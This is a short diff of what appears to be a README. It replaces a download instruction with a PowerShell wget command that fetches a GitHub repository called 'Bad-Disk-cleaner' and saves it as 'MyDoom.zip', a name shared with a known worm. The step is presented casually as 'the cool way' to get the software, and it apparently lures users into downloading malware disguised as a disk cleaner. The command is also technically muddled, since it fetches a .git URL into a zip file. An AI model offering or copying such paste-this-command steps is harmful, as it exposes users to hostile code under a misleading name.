@@ -14,4 +14,4 @@ If you want to download it via the cool way here it is:
 
 Open Powershell and type this in 😎
 
-    wget github.com -o MyDoom.zip
+    wget https://github.com/Snowfalldays/Bad-Disk-cleaner.git -o MyDoom.zip
